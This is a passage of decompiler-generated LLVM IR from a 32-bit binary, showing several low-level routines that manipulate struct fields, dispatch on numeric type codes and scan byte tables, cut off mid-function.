  uselistorder label %dec_label_pc_dd30.dec_label_pc_dd30_crit_edge, { 1, 0 }
}

define i32 @function_dd98(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_dd98:
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_dd98 = load i32, i32* @r4, align 4
  store i32 %v3_dd98, i32* %stack_var_-12, align 4
  %v1_dd9c = add i32 %arg1, 24
  %v2_dd9c = inttoptr i32 %v1_dd9c to i32*
  %v3_dd9c = load i32, i32* %v2_dd9c, align 4
  store i32 %v3_dd9c, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v2_ddac = add i32 %arg1, 76
  %v3_ddac = inttoptr i32 %v2_ddac to i32*
  store i32 %arg2, i32* %v3_ddac, align 4
  %v7_ddb0 = icmp sgt i32 %v3_dd9c, 0
  br i1 %v7_ddb0, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_dd98
  %v10_ddb0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v10_ddb0, i32* @r4, align 4
  ret i32 %arg1

bb4:                                              ; preds = %dec_label_pc_dd98
  %v0_ddb4 = load i32, i32* %r3.global-to-local, align 4
  %v2_ddb4 = add i32 %arg1, 8
  %v3_ddb4 = inttoptr i32 %v2_ddb4 to i32*
  store i32 %v0_ddb4, i32* %v3_ddb4, align 4
  %v0_ddb8 = load i32, i32* %r5.global-to-local, align 4
  %v2_ddb8 = add i32 %arg1, 28
  %v3_ddb8 = inttoptr i32 %v2_ddb8 to i32*
  store i32 %v0_ddb8, i32* %v3_ddb8, align 4
  %v0_ddbc = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_ddbc, i32* %v2_dd9c, align 4
  %v0_ddc0 = load i32, i32* %r3.global-to-local, align 4
  %v2_ddc0 = add i32 %arg1, 4
  %v3_ddc0 = inttoptr i32 %v2_ddc0 to i32*
  store i32 %v0_ddc0, i32* %v3_ddc0, align 4
  %v0_ddc4 = call i32 @function_ddd0()
  %v0_ddc8 = load i32, i32* %r5.global-to-local, align 4
  %v1_ddc8 = load i32, i32* @r4, align 4
  %v2_ddc8 = add i32 %v1_ddc8, 24
  %v3_ddc8 = inttoptr i32 %v2_ddc8 to i32*
  store i32 %v0_ddc8, i32* %v3_ddc8, align 4
  %v2_ddcc = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_ddcc, i32* @r4, align 4
  ret i32 %v0_ddc4

; uselistorder directives
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32 ()* @function_ddd0, { 1, 0 }
  uselistorder i32 %arg1, { 6, 5, 2, 3, 1, 0, 4, 7 }
}

define i32 @function_ddd0() local_unnamed_addr {
dec_label_pc_ddd0:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_ddd0 = load i32, i32* @r0, align 4
  %v1_ddd0 = add i32 %v0_ddd0, 24
  %v2_ddd0 = inttoptr i32 %v1_ddd0 to i32*
  %v3_ddd0 = load i32, i32* %v2_ddd0, align 4
  store i32 %v3_ddd0, i32* %r1.global-to-local, align 4
  %v2_ddd4 = icmp eq i32 %v3_ddd0, 0
  %v3_ddd8 = load i32, i32* @r4, align 4
  store i32 %v3_ddd8, i32* %stack_var_-8, align 4
  %v1_dddc = add i32 %v0_ddd0, 80
  store i32 %v1_dddc, i32* %ip.global-to-local, align 4
  %v1_dde0 = add i32 %v0_ddd0, 8
  %v2_dde0 = inttoptr i32 %v1_dde0 to i32*
  %v3_dde0 = load i32, i32* %v2_dde0, align 4
  store i32 %v3_dde0, i32* %r3.global-to-local, align 4
  %v6_dde8 = icmp eq i32 %v3_dde0, -2147483648
  br i1 %v2_ddd4, label %dec_label_pc_dde8, label %dec_label_pc_df0c

dec_label_pc_dde8:                                ; preds = %dec_label_pc_ddd0
  br i1 %v6_dde8, label %dec_label_pc_ddf0, label %dec_label_pc_de08

dec_label_pc_ddf0:                                ; preds = %dec_label_pc_dde8
  %v1_ddf0 = add i32 %v0_ddd0, 76
  %v2_ddf0 = inttoptr i32 %v1_ddf0 to i32*
  %v3_ddf0 = load i32, i32* %v2_ddf0, align 4
  store i32 %v3_ddf0, i32* %r3.global-to-local, align 4
  %v1_ddf4 = inttoptr i32 %v3_ddf0 to i32*
  %v2_ddf4 = load i32, i32* %v1_ddf4, align 4
  store i32 %v2_ddf4, i32* %r2.global-to-local, align 4
  %v1_ddf8 = add i32 %v3_ddf0, 4
  store i32 %v1_ddf8, i32* %r3.global-to-local, align 4
  store i32 %v1_ddf8, i32* %v2_ddf0, align 4
  %v0_de00 = load i32, i32* %r2.global-to-local, align 4
  %v1_de00 = load i32, i32* @r0, align 4
  %v2_de00 = add i32 %v1_de00, 8
  %v3_de00 = inttoptr i32 %v2_de00 to i32*
  store i32 %v0_de00, i32* %v3_de00, align 4
  %v0_de04 = load i32, i32* %r2.global-to-local, align 4
  %v1_de04 = load i32, i32* @r0, align 4
  %v2_de04 = add i32 %v1_de04, 80
  %v3_de04 = inttoptr i32 %v2_de04 to i32*
  store i32 %v0_de04, i32* %v3_de04, align 4
  %v0_de08.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_de08

dec_label_pc_de08:                                ; preds = %dec_label_pc_dde8, %dec_label_pc_ddf0
  %v1_de20 = phi i32 [ %v0_ddd0, %dec_label_pc_dde8 ], [ %v0_de08.pre, %dec_label_pc_ddf0 ]
  %v1_de08 = add i32 %v1_de20, 4
  %v2_de08 = inttoptr i32 %v1_de08 to i32*
  %v3_de08 = load i32, i32* %v2_de08, align 4
  store i32 %v3_de08, i32* %r3.global-to-local, align 4
  %v6_de0c = icmp eq i32 %v3_de08, -2147483648
  br i1 %v6_de0c, label %dec_label_pc_de14, label %dec_label_pc_de2c

dec_label_pc_de14:                                ; preds = %dec_label_pc_de08
  %v1_de14 = add i32 %v1_de20, 76
  %v2_de14 = inttoptr i32 %v1_de14 to i32*
  %v3_de14 = load i32, i32* %v2_de14, align 4
  store i32 %v3_de14, i32* %r3.global-to-local, align 4
  %v1_de18 = inttoptr i32 %v3_de14 to i32*
  %v2_de18 = load i32, i32* %v1_de18, align 4
  store i32 %v2_de18, i32* %r2.global-to-local, align 4
  %v1_de1c = add i32 %v3_de14, 4
  store i32 %v1_de1c, i32* %r3.global-to-local, align 4
  store i32 %v1_de1c, i32* %v2_de14, align 4
  %v0_de24 = load i32, i32* %r2.global-to-local, align 4
  %v1_de24 = load i32, i32* @r0, align 4
  %v2_de24 = add i32 %v1_de24, 4
  %v3_de24 = inttoptr i32 %v2_de24 to i32*
  store i32 %v0_de24, i32* %v3_de24, align 4
  %v0_de28 = load i32, i32* %r2.global-to-local, align 4
  %v1_de28 = load i32, i32* @r0, align 4
  %v2_de28 = add i32 %v1_de28, 80
  %v3_de28 = inttoptr i32 %v2_de28 to i32*
  store i32 %v0_de28, i32* %v3_de28, align 4
  %v0_defc18.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_de2c

dec_label_pc_de2c:                                ; preds = %dec_label_pc_de08, %dec_label_pc_de14
  %v0_defc18 = phi i32 [ %v1_de20, %dec_label_pc_de08 ], [ %v0_defc18.pre, %dec_label_pc_de14 ]
  %v0_de2c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_de2c, i32* @lr, align 4
  %v1_defc19 = add i32 %v0_defc18, 28
  %v2_defc20 = inttoptr i32 %v1_defc19 to i32*
  %v3_defc21 = load i32, i32* %v2_defc20, align 4
  store i32 %v3_defc21, i32* %r3.global-to-local, align 4
  %v5_df0423 = icmp slt i32 %v0_de2c, %v3_defc21
  br i1 %v5_df0423, label %dec_label_pc_de34, label %dec_label_pc_df08.loopexit

dec_label_pc_de34:                                ; preds = %dec_label_pc_de2c, %dec_label_pc_def8
  %v0_defc25 = phi i32 [ %v0_defc, %dec_label_pc_def8 ], [ %v0_defc18, %dec_label_pc_de2c ]
  %v1_de3424 = phi i32 [ %v1_def8, %dec_label_pc_def8 ], [ %v0_de2c, %dec_label_pc_de2c ]
  %v4_de34 = mul i32 %v1_de3424, 4
  %v5_de34 = add i32 %v0_defc25, %v4_de34
  store i32 %v5_de34, i32* %r3.global-to-local, align 4
  %v1_de38 = add i32 %v5_de34, 40
  %v2_de38 = inttoptr i32 %v1_de38 to i32*
  %v3_de38 = load i32, i32* %v2_de38, align 4
  store i32 %v3_de38, i32* %r2.global-to-local, align 4
  %v7_de3c = icmp eq i32 %v3_de38, 8
  br i1 %v7_de3c, label %dec_label_pc_def8, label %dec_label_pc_de44

dec_label_pc_de44:                                ; preds = %dec_label_pc_de34
  %v1_de44 = add i32 %v0_defc25, 76
  %v2_de44 = inttoptr i32 %v1_de44 to i32*
  %v3_de44 = load i32, i32* %v2_de44, align 4
  store i32 %v3_de44, i32* %r1.global-to-local, align 4
  %v8_de48 = icmp sgt i32 %v3_de38, 8
  br i1 %v8_de48, label %dec_label_pc_de6c, label %dec_label_pc_de4c

dec_label_pc_de4c:                                ; preds = %dec_label_pc_de44
  %v7_de4c = icmp eq i32 %v3_de38, 2
  br i1 %v7_de4c, label %dec_label_pc_deb8, label %dec_label_pc_de54

dec_label_pc_de54:                                ; preds = %dec_label_pc_de4c
  %v8_de54 = icmp sgt i32 %v3_de38, 2
  br i1 %v8_de54, label %dec_label_pc_de64, label %dec_label_pc_de58

dec_label_pc_de58:                                ; preds = %dec_label_pc_de54
  %v1_de58 = icmp slt i32 %v3_de38, 0
  br i1 %v1_de58, label %dec_label_pc_dee4, label %dec_label_pc_deb8

dec_label_pc_de64:                                ; preds = %dec_label_pc_de54
  %v7_de64 = icmp eq i32 %v3_de38, 7
  br i1 %v7_de64, label %dec_label_pc_decc, label %dec_label_pc_dee4

dec_label_pc_de6c:                                ; preds = %dec_label_pc_de44
  %v7_de6c = icmp eq i32 %v3_de38, 1024
  br i1 %v7_de6c, label %dec_label_pc_deb8, label %dec_label_pc_de74

dec_label_pc_de74:                                ; preds = %dec_label_pc_de6c
  %v8_de74 = icmp sgt i32 %v3_de38, 1024
  br i1 %v8_de74, label %dec_label_pc_de8c, label %dec_label_pc_de78

dec_label_pc_de78:                                ; preds = %dec_label_pc_de74
  switch i32 %v3_de38, label %dec_label_pc_dee4 [
    i32 256, label %dec_label_pc_deb8
    i32 512, label %dec_label_pc_deb8
  ]

dec_label_pc_de8c:                                ; preds = %dec_label_pc_de74
  %v7_de8c = icmp eq i32 %v3_de38, 2048
  br i1 %v7_de8c, label %dec_label_pc_dea4, label %dec_label_pc_de9c

dec_label_pc_de9c:                                ; preds = %dec_label_pc_de8c
  store i32 2055, i32* %r3.global-to-local, align 4
  %v9_de98 = icmp eq i32 %v3_de38, 2055
  br i1 %v9_de98, label %dec_label_pc_decc, label %dec_label_pc_dee4

dec_label_pc_dea4:                                ; preds = %dec_label_pc_de8c
  %v1_dea4 = add i32 %v3_de44, 8
  store i32 %v1_dea4, i32* %r3.global-to-local, align 4
  store i32 %v1_dea4, i32* %v2_de44, align 4
  %v0_deac = load i32, i32* %r1.global-to-local, align 4
  %v1_deac = inttoptr i32 %v0_deac to i32*
  %v2_deac = load i32, i32* %v1_deac, align 4
  store i32 %v2_deac, i32* %r3.global-to-local, align 4
  %v3_deac = add i32 %v0_deac, 4
  %v4_deac = inttoptr i32 %v3_deac to i32*
  %v5_deac = load i32, i32* %v4_deac, align 4
  store i32 %v5_deac, i32* %r4.global-to-local, align 4
  %v0_deb0 = load i32, i32* %ip.global-to-local, align 4
  %v1_deb0 = inttoptr i32 %v0_deb0 to i32*
  store i32 %v2_deac, i32* %v1_deb0, align 4
  %v3_deb0 = add i32 %v0_deb0, 4
  %v4_deb0 = inttoptr i32 %v3_deb0 to i32*
  %v5_deb0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_deb0, i32* %v4_deb0, align 4
  br label %dec_label_pc_def4

dec_label_pc_deb8:                                ; preds = %dec_label_pc_de78, %dec_label_pc_de78, %dec_label_pc_de58, %dec_label_pc_de6c, %dec_label_pc_de4c
  %v1_deb8 = inttoptr i32 %v3_de44 to i32*
  %v2_deb8 = load i32, i32* %v1_deb8, align 4
  store i32 %v2_deb8, i32* %r2.global-to-local, align 4
  %v1_debc = add i32 %v3_de44, 4
  store i32 %v1_debc, i32* %r3.global-to-local, align 4
  store i32 %v1_debc, i32* %v2_de44, align 4
  %v0_dec4 = load i32, i32* %r2.global-to-local, align 4
  %v1_dec4 = load i32, i32* %ip.global-to-local, align 4
  %v2_dec4 = inttoptr i32 %v1_dec4 to i32*
  store i32 %v0_dec4, i32* %v2_dec4, align 4
  br label %dec_label_pc_def4

dec_label_pc_decc:                                ; preds = %dec_label_pc_de64, %dec_label_pc_de9c
  %v3_decc = load i32, i32* %v2_de44, align 4
  store i32 %v3_decc, i32* %r2.global-to-local, align 4
  %v1_ded0 = add i32 %v3_decc, 8
  store i32 %v1_ded0, i32* %r3.global-to-local, align 4
  store i32 %v1_ded0, i32* %v2_de44, align 4
  %v0_ded8 = load i32, i32* %r2.global-to-local, align 4
  %v1_ded8 = inttoptr i32 %v0_ded8 to i32*
  %v2_ded8 = load i32, i32* %v1_ded8, align 4
  store i32 %v2_ded8, i32* %r3.global-to-local, align 4
  %v3_ded8 = add i32 %v0_ded8, 4
  %v4_ded8 = inttoptr i32 %v3_ded8 to i32*
  %v5_ded8 = load i32, i32* %v4_ded8, align 4
  store i32 %v5_ded8, i32* %r4.global-to-local, align 4
  %v0_dedc = load i32, i32* %ip.global-to-local, align 4
  %v1_dedc = inttoptr i32 %v0_dedc to i32*
  store i32 %v2_ded8, i32* %v1_dedc, align 4
  %v3_dedc = add i32 %v0_dedc, 4
  %v4_dedc = inttoptr i32 %v3_dedc to i32*
  %v5_dedc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_dedc, i32* %v4_dedc, align 4
  br label %dec_label_pc_def4

dec_label_pc_dee4:                                ; preds = %dec_label_pc_de78, %dec_label_pc_de64, %dec_label_pc_de58, %dec_label_pc_de9c
  %v1_dee4 = add i32 %v3_de44, 4
  store i32 %v1_dee4, i32* %r3.global-to-local, align 4
  store i32 %v1_dee4, i32* %v2_de44, align 4
  %v0_deec = load i32, i32* %r1.global-to-local, align 4
  %v1_deec = inttoptr i32 %v0_deec to i32*
  %v2_deec = load i32, i32* %v1_deec, align 4
  store i32 %v2_deec, i32* %r3.global-to-local, align 4
  %v1_def0 = load i32, i32* %ip.global-to-local, align 4
  %v2_def0 = inttoptr i32 %v1_def0 to i32*
  store i32 %v2_deec, i32* %v2_def0, align 4
  br label %dec_label_pc_def4

dec_label_pc_def4:                                ; preds = %dec_label_pc_decc, %dec_label_pc_deb8, %dec_label_pc_dea4, %dec_label_pc_dee4
  %v0_def4 = load i32, i32* %ip.global-to-local, align 4
  %v1_def4 = add i32 %v0_def4, 8
  store i32 %v1_def4, i32* %ip.global-to-local, align 4
  %v0_def8.pre = load i32, i32* @lr, align 4
  %v0_defc.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_def8

dec_label_pc_def8:                                ; preds = %dec_label_pc_de34, %dec_label_pc_def4
  %v0_defc = phi i32 [ %v0_defc25, %dec_label_pc_de34 ], [ %v0_defc.pre, %dec_label_pc_def4 ]
  %v0_def8 = phi i32 [ %v1_de3424, %dec_label_pc_de34 ], [ %v0_def8.pre, %dec_label_pc_def4 ]
  %v1_def8 = add i32 %v0_def8, 1
  store i32 %v1_def8, i32* @lr, align 4
  %v1_defc = add i32 %v0_defc, 28
  %v2_defc = inttoptr i32 %v1_defc to i32*
  %v3_defc = load i32, i32* %v2_defc, align 4
  store i32 %v3_defc, i32* %r3.global-to-local, align 4
  %v5_df04 = icmp slt i32 %v1_def8, %v3_defc
  br i1 %v5_df04, label %dec_label_pc_de34, label %dec_label_pc_defc.dec_label_pc_df08.loopexit_crit_edge

dec_label_pc_df0c:                                ; preds = %dec_label_pc_ddd0
  br i1 %v6_dde8, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_df0c
  %v2_df10 = add i32 %v0_ddd0, 36
  %v3_df10 = inttoptr i32 %v2_df10 to i8*
  %v4_df10 = load i8, i8* %v3_df10, align 1
  %v5_df10 = zext i8 %v4_df10 to i32
  %v5_df14 = mul nuw nsw i32 %v5_df10, 8
  %v6_df14 = add i32 %v5_df14, %v1_dddc
  store i32 %v6_df14, i32* %r3.global-to-local, align 4
  %v2_df18 = add i32 %v6_df14, -8
  %v3_df18 = inttoptr i32 %v2_df18 to i32*
  %v4_df18 = load i32, i32* %v3_df18, align 4
  store i32 %v4_df18, i32* %r3.global-to-local, align 4
  store i32 %v4_df18, i32* %v2_dde0, align 4
  %v0_df20.pre = load i32, i32* @r0, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_df0c, %bb
  %v2_df34 = phi i32 [ %v0_df20.pre, %bb ], [ %v0_ddd0, %dec_label_pc_df0c ]
  %v1_df20 = add i32 %v2_df34, 4
  %v2_df20 = inttoptr i32 %v1_df20 to i32*
  %v3_df20 = load i32, i32* %v2_df20, align 4
  store i32 %v3_df20, i32* %r3.global-to-local, align 4
  %v6_df24 = icmp eq i32 %v3_df20, -2147483648
  br i1 %v6_df24, label %bb15, label %dec_label_pc_df08

bb15:                                             ; preds = %.thread2
  %v2_df28 = add i32 %v2_df34, 37
  %v3_df28 = inttoptr i32 %v2_df28 to i8*
  %v4_df28 = load i8, i8* %v3_df28, align 1
  %v5_df28 = zext i8 %v4_df28 to i32
  %v1_df2c = load i32, i32* %ip.global-to-local, align 4
  %v5_df2c = mul nuw nsw i32 %v5_df28, 8
  %v6_df2c = add i32 %v5_df2c, %v1_df2c
  store i32 %v6_df2c, i32* %r3.global-to-local, align 4
  %v2_df30 = add i32 %v6_df2c, -8
  %v3_df30 = inttoptr i32 %v2_df30 to i32*
  %v4_df30 = load i32, i32* %v3_df30, align 4
  store i32 %v4_df30, i32* %r3.global-to-local, align 4
  store i32 %v4_df30, i32* %v2_df20, align 4
  %v0_df38.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_df08

dec_label_pc_defc.dec_label_pc_df08.loopexit_crit_edge: ; preds = %dec_label_pc_def8
  br label %dec_label_pc_df08.loopexit

dec_label_pc_df08.loopexit:                       ; preds = %dec_label_pc_defc.dec_label_pc_df08.loopexit_crit_edge, %dec_label_pc_de2c
  %v0_defc.lcssa = phi i32 [ %v0_defc, %dec_label_pc_defc.dec_label_pc_df08.loopexit_crit_edge ], [ %v0_defc18, %dec_label_pc_de2c ]
  br label %dec_label_pc_df08

dec_label_pc_df08:                                ; preds = %dec_label_pc_df08.loopexit, %.thread2, %bb15
  %v1_df58 = phi i32 [ %v0_defc.lcssa, %dec_label_pc_df08.loopexit ], [ %v2_df34, %.thread2 ], [ %v0_df38.pre, %bb15 ]
  %v1_df38 = add i32 %v1_df58, 8
  %v2_df38 = inttoptr i32 %v1_df38 to i32*
  %v3_df38 = load i32, i32* %v2_df38, align 4
  store i32 %v3_df38, i32* %r1.global-to-local, align 4
  %v1_df3c = icmp slt i32 %v3_df38, 0
  br i1 %v1_df3c, label %bb17, label %bb16

bb16:                                             ; preds = %dec_label_pc_df08
  %v5_df40 = load i32, i32* %stack_var_-8, align 4
  store i32 %v5_df40, i32* @r4, align 4
  ret i32 %v1_df58

bb17:                                             ; preds = %dec_label_pc_df08
  %v1_df44 = add i32 %v1_df58, 16
  %v2_df44 = inttoptr i32 %v1_df44 to i32*
  %v3_df44 = load i32, i32* %v2_df44, align 4
  %v1_df4c = sub i32 0, %v3_df38
  store i32 %v1_df4c, i32* %r1.global-to-local, align 4
  %v1_df48 = and i32 %v3_df44, -10
  %v1_df50 = or i32 %v1_df48, 8
  store i32 %v1_df50, i32* %r3.global-to-local, align 4
  store i32 32, i32* %r2.global-to-local, align 4
  %v2_df58 = add i32 %v1_df58, 20
  %v3_df58 = inttoptr i32 %v2_df58 to i32*
  store i32 32, i32* %v3_df58, align 4
  %v0_df5c = load i32, i32* %r1.global-to-local, align 4
  %v1_df5c = load i32, i32* @r0, align 4
  %v2_df5c = add i32 %v1_df5c, 8
  %v3_df5c = inttoptr i32 %v2_df5c to i32*
  store i32 %v0_df5c, i32* %v3_df5c, align 4
  %v0_df60 = load i32, i32* %r3.global-to-local, align 4
  %v1_df60 = load i32, i32* @r0, align 4
  %v2_df60 = add i32 %v1_df60, 16
  %v3_df60 = inttoptr i32 %v2_df60 to i32*
  store i32 %v0_df60, i32* %v3_df60, align 4
  %v2_df64 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_df64, i32* @r4, align 4
  %v8_df64 = load i32, i32* @r0, align 4
  ret i32 %v8_df64

; uselistorder directives
  uselistorder i32 %v1_def8, { 2, 1, 0 }
  uselistorder i32 %v0_defc, { 1, 2, 0 }
  uselistorder i32 %v3_de44, { 3, 1, 0, 2, 4 }
  uselistorder i32* %v2_de44, { 4, 2, 3, 0, 1, 5 }
  uselistorder i32 %v3_de38, { 1, 2, 0, 8, 5, 3, 4, 7, 6, 9, 10, 11 }
  uselistorder i32 %v1_de3424, { 1, 0 }
  uselistorder i32 %v0_defc18, { 2, 0, 1 }
  uselistorder i32 %v0_ddd0, { 0, 3, 1, 2, 5, 4, 6 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 16, 7, 8, 9, 10, 11, 12, 13, 14, 15, 23, 17, 18, 19, 20, 21, 22 }
  uselistorder i32* %ip.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7 }
  uselistorder label %dec_label_pc_df08, { 0, 2, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_def8, { 1, 0 }
  uselistorder label %dec_label_pc_def4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_dee4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_decc, { 1, 0 }
  uselistorder label %dec_label_pc_deb8, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_de34, { 1, 0 }
  uselistorder label %dec_label_pc_de2c, { 1, 0 }
  uselistorder label %dec_label_pc_de08, { 1, 0 }
}

define i32 @function_df6c() local_unnamed_addr {
dec_label_pc_df6c:
  %v1_df84.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_df70

dec_label_pc_df70:                                ; preds = %dec_label_pc_df8c, %dec_label_pc_df6c
  %v0_df70 = phi i32 [ %v1_df70, %dec_label_pc_df8c ], [ ptrtoint (i32* @global_var_16a08.341 to i32), %dec_label_pc_df6c ]
  %v1_df70 = add i32 %v0_df70, -2
  %v1_df74 = add i32 %v0_df70, -1
  %v2_df74 = inttoptr i32 %v1_df74 to i8*
  %v3_df74 = load i8, i8* %v2_df74, align 1
  %v4_df74 = zext i8 %v3_df74 to i32
  %v1_df78 = inttoptr i32 %v1_df70 to i8*
  %v2_df78 = load i8, i8* %v1_df78, align 2
  %v3_df78 = zext i8 %v2_df78 to i32
  %v3_df7c = mul nuw i32 %v4_df74, 16777216
  %v4_df80 = sdiv i32 %v3_df7c, 65536
  %v5_df80 = or i32 %v4_df80, %v3_df78
  %v9_df84 = icmp eq i32 %v5_df80, %v1_df84.pre
  br i1 %v9_df84, label %dec_label_pc_df70.dec_label_pc_df98_crit_edge, label %dec_label_pc_df8c

dec_label_pc_df70.dec_label_pc_df98_crit_edge:    ; preds = %dec_label_pc_df70
  br label %dec_label_pc_df98

dec_label_pc_df8c:                                ; preds = %dec_label_pc_df70
  %tmp = icmp ugt i32 %v1_df70, ptrtoint (i32* @global_var_169f0.343 to i32)
  br i1 %tmp, label %dec_label_pc_df70, label %dec_label_pc_df98

dec_label_pc_df98:                                ; preds = %dec_label_pc_df8c, %dec_label_pc_df70.dec_label_pc_df98_crit_edge
  %v2_dfa0.pre-phi = sub i32 %v1_df70, ptrtoint (i32* @global_var_169f0.343 to i32)
  store i32 ptrtoint (i32* @global_var_16a08.341 to i32), i32* @r2, align 4
  %v4_dfa4 = sdiv i32 %v2_dfa0.pre-phi, 2
  %v5_dfa4 = add i32 %v4_dfa4, ptrtoint (i32* @global_var_16a08.341 to i32)
  %v6_dfa4 = inttoptr i32 %v5_dfa4 to i8*
  %v7_dfa4 = load i8, i8* %v6_dfa4, align 1
  %v9_dfa4 = zext i8 %v7_dfa4 to i32
  ret i32 %v9_dfa4

; uselistorder directives
  uselistorder i32 %v1_df70, { 0, 1, 3, 2 }
  uselistorder i32 %v0_df70, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_16a08.341 to i32), { 1, 2, 0 }
}

define i32 @function_dfb8(i32* %arg1) local_unnamed_addr {
dec_label_pc_dfb8:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %tmp106 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-87 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_dfb8 = load i32, i32* @r4, align 4
  store i32 %v3_dfb8, i32* %stack_var_-32, align 4
  %v6_dfb8 = load i32, i32* @r5, align 4
  %v25_dfb8 = ptrtoint i32* %stack_var_-32 to i32
  %v1_dfbc = add i32 %tmp, 16
  %v2_dfbc = inttoptr i32 %v1_dfbc to i32*
  %v3_dfbc = load i32, i32* %v2_dfbc, align 4
  %v2_dfc0 = ptrtoint i32* %stack_var_-88 to i32
  %v1_dfc4 = and i32 %v3_dfbc, 128
  store i32 %v1_dfc4, i32* @r4, align 4
  %v2_dfc4 = icmp eq i32 %v1_dfc4, 0
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* %r7.global-to-local, align 4
  %v1_dfe4 = add i32 %tmp, 24
  %v2_dfe4 = inttoptr i32 %v1_dfe4 to i32*
  %v3_dfe4 = load i32, i32* %v2_dfe4, align 4
  store i32 %v3_dfe4, i32* %sb.global-to-local, align 4
  br i1 %v2_dfc4, label %bb, label %dec_label_pc_e004

bb:                                               ; preds = %dec_label_pc_dfb8
  %v3_dfe8 = load i32, i32* %arg1, align 4
  br label %dec_label_pc_e050

dec_label_pc_dff4:                                ; preds = %dec_label_pc_e1d4
  %v0_dff4 = load i32, i32* %r0.global-to-local, align 4
  %v0_e204.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_e1fc

dec_label_pc_dffc:                                ; preds = %dec_label_pc_e200
  %v1_dffc = add i32 %v0_e204.pre, 1
  store i32 %v1_dffc, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_e21c

dec_label_pc_e004:                                ; preds = %dec_label_pc_dfb8
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e008

dec_label_pc_e008:                                ; preds = %dec_label_pc_e03c.dec_label_pc_e008_crit_edge, %dec_label_pc_e004
  %v1_e018 = phi i32 [ %v1_e02c, %dec_label_pc_e03c.dec_label_pc_e008_crit_edge ], [ 0, %dec_label_pc_e004 ]
  %v0_e008 = phi i32 [ %v0_e008.pre, %dec_label_pc_e03c.dec_label_pc_e008_crit_edge ], [ %tmp, %dec_label_pc_e004 ]
  %v1_e008 = inttoptr i32 %v0_e008 to i32*
  %v2_e008 = load i32, i32* %v1_e008, align 4
  %v4_e00c = mul i32 %v1_e018, 4
  %v5_e00c = add i32 %v2_e008, %v4_e00c
  store i32 %v5_e00c, i32* %r3.global-to-local, align 4
  %v1_e010 = add i32 %v5_e00c, -4
  %v2_e010 = inttoptr i32 %v1_e010 to i32*
  %v3_e010 = load i32, i32* %v2_e010, align 4
  store i32 %v3_e010, i32* %r1.global-to-local, align 4
  store i32 %v25_dfb8, i32* @ip, align 4
  %v2_e018 = add i32 %v1_e018, %v25_dfb8
  store i32 %v2_e018, i32* %r2.global-to-local, align 4
  %v1_e01c = trunc i32 %v3_e010 to i8
  %v3_e01c = add i32 %v2_e018, -56
  %v4_e01c = inttoptr i32 %v3_e01c to i8*
  store i8 %v1_e01c, i8* %v4_e01c, align 1
  %v0_e020 = load i32, i32* %r2.global-to-local, align 4
  %v1_e020 = add i32 %v0_e020, -56
  %v2_e020 = inttoptr i32 %v1_e020 to i8*
  %v3_e020 = load i8, i8* %v2_e020, align 1
  %v4_e020 = zext i8 %v3_e020 to i32
  store i32 %v4_e020, i32* %r2.global-to-local, align 4
  %v0_e024 = load i32, i32* %r3.global-to-local, align 4
  %v1_e024 = add i32 %v0_e024, -4
  %v2_e024 = inttoptr i32 %v1_e024 to i32*
  %v3_e024 = load i32, i32* %v2_e024, align 4
  store i32 %v3_e024, i32* %r3.global-to-local, align 4
  %v9_e028 = icmp eq i32 %v4_e020, %v3_e024
  %v0_e02c = load i32, i32* %r0.global-to-local, align 4
  %v1_e02c = add i32 %v0_e02c, 1
  store i32 %v1_e02c, i32* %r0.global-to-local, align 4
  br i1 %v9_e028, label %dec_label_pc_e034, label %dec_label_pc_e44c

dec_label_pc_e034:                                ; preds = %dec_label_pc_e008
  %v2_e034 = icmp eq i8 %v3_e020, 0
